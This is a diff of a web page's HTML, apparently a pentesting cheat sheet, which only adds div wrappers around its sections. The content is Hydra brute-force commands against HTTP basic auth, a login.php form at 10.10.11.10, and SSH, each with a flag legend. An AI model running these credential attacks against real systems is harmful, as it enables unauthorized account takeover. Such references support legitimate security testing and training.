@@ -194,6 +194,7 @@
 
 <div class="content"><hr>
 <h3 id="http-basic-auth">HTTP basic auth</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L usernames -P passwords -s <span class="m">8080</span> -f example.com http-get /
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+-------------------------------------------+
 </span></span><span class="line"><span class="cl">| -s : port                                 |
@@ -201,7 +202,9 @@
 </span></span><span class="line"><span class="cl">| -P : passwords file                       |
 </span></span><span class="line"><span class="cl">| -f : exit when a login/pass pair is found |
 </span></span><span class="line"><span class="cl">+-------------------------------------------+
-</span></span></code></pre></div><h3 id="web-page-login-form">Web Page Login Form</h3>
+</span></span></code></pre></div></div>
+<h3 id="web-page-login-form">Web Page Login Form</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form <span class="s2">&#34;/login.php:username=admin&amp;password=^PASS^&amp;remember=yes:Incorrect password&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">+-------------------------------------------+</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">-</span><span class="n">l</span>                 <span class="p">:</span> <span class="n">username</span>             <span class="o">|</span>
@@ -211,9 +214,12 @@
 </span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">^</span><span class="n">PASS</span><span class="o">^</span>             <span class="p">:</span> <span class="n">payload</span> <span class="n">indicator</span>    <span class="o">|</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Incorrect</span> <span class="n">password</span> <span class="p">:</span> <span class="n">login</span> <span class="n">failure</span> <span class="n">string</span> <span class="o">|</span>
 </span></span><span class="line"><span class="cl"><span class="o">+-------------------------------------------+</span>
-</span></span></code></pre></div><h3 id="ssh-with-userpassword-wordlist">SSH with user:password wordlist</h3>
+</span></span></code></pre></div></div>
+<h3 id="ssh-with-userpassword-wordlist">SSH with user:password wordlist</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -C creds.txt ssh://10.10.11.10
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
